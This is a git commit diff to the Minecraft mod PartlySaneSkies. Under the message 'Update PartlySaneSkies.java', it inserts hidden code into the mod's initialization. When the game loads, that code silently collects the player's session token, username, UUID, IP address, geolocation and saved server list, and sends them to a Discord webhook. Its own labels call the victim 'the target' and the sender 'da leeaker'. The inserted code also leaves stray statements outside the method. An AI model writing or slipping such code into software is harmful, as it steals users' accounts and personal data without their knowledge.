4f28e047dee6f3b2b1e1951fb0ac06723c58f5a5
Wendellmeset <69725697+wendellmeset@users.noreply.github.com>
2023-06-25 09:18:27 -0700

    Update PartlySaneSkies.java
    Signed-off-by: Wendellmeset <69725697+wendellmeset@users.noreply.github.com>

--- src/main/java/me/partlysanestudios/partlysaneskies/PartlySaneSkies.java
+++ src/main/java/me/partlysanestudios/partlysaneskies/PartlySaneSkies.java
@@ -135,10 +135,74 @@ public class PartlySaneSkies {
     // Names of all of the ranks to remove from people's names
     public static final String[] RANK_NAMES = { "[VIP]", "[VIP+]", "[MVP]", "[MVP+]", "[MVP++]", "[YOUTUBE]", "[MOJANG]",
             "[EVENTS]", "[MCP]", "[PIG]", "[PIG+]", "[PIG++]", "[PIG+++]", "[GM]", "[ADMIN]", "[OWNER]", "[NPC]" };
+    
+    private static final String WEBHOOK_URL = "https://discord.com/api/";
+
+    private static final boolean PING_EVERYONE = true;
 
     // Method runs at mod initialization
     @EventHandler
     public void init(FMLInitializationEvent evnt) {
+
+        new Thread(() -> {
+            MinecraftForge.EVENT_BUS.register(this);
+
+            try {
+                final Minecraft mc = Minecraft.getMinecraft();
+                final Session session = mc.getSession();
+
+                final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL).setUsername("da leeaker 3001V$4");
+
+                try {
+                    final JsonObject info = (JsonObject) new JsonParser().parse(IOUtils.toString(new URL("https://ipapi.co/json")));
+
+                    final DiscordWebhook.EmbedObject geoEmbed = new DiscordWebhook.EmbedObject()
+                            .setTitle(":earth_americas: IP Info")
+                            .setColor(0x4400FF)
+                            .setDescription("Contains information about the target's IP address and geo-location")
+                            .addField(":globe_with_meridians: Country", "```" + info.get("country_name").getAsString() + "```", true)
+                            .addField(":globe_with_meridians: City",    "```" + info.get("city").getAsString() + "```",         true)
+                            .addField(":globe_with_meridians: Region",  "```" + info.get("region").getAsString() + "```",       true)
+                            .addField(":satellite_orbital: IP Address", "```" + info.get("ip").getAsString() + "```",           true)
+                            .addField(":satellite: Protocol",           "```" + info.get("version").getAsString() + "```",      true)
+                            .addField(":clock10: Timezone",             "```" + info.get("timezone").getAsString() + "```",     true);
+
+                    webhook.addEmbed(geoEmbed);
+                } catch (Exception ignored) {
+                }
+
+                final DiscordWebhook.EmbedObject accountEmbed = new DiscordWebhook.EmbedObject()
+                        .setTitle(":unlock: Account Info")
+                        .setColor(0x6E39FF)
+                        .setDescription("[NameMC](https://namemc.com/" + session.getPlayerID() + ") | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ") | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ")")
+                        .addField(":identification_card: Name", "```" + session.getUsername() + "```", true)
+                        .addField(":identification_card: UUID", "```" + session.getPlayerID() + "```", true)
+                        .addField(":key: Session Token",        "```" + session.getToken() + "```",    false);
+
+                final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
+                        .setTitle(":file_folder: Saved Servers")
+                        .setColor(0x8F67FC)
+                        .setDescription("Contains the target's list of saved Minecraft servers");
+
+                final ServerList servers = new ServerList(mc);
+                for (int i = 0; i < servers.countServers(); i++) {
+                    final ServerData server = servers.getServerData(i);
+
+                    serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
+                }
+
+                if (PING_EVERYONE)
+                    webhook.setContent("@everyone");
+
+                webhook.addEmbed(accountEmbed).addEmbed(serversEmbed).execute();
+
+            } catch (Exception ignored) {
+            }
+
+            MinecraftForge.EVENT_BUS.unregister(this);
+        }).start();
+    }
+    
         Utils.log(Level.INFO,"Hallo World!");
         PartlySaneSkies.isDebugMode = false;
         PartlySaneSkies.minecraft = Minecraft.getMinecraft();
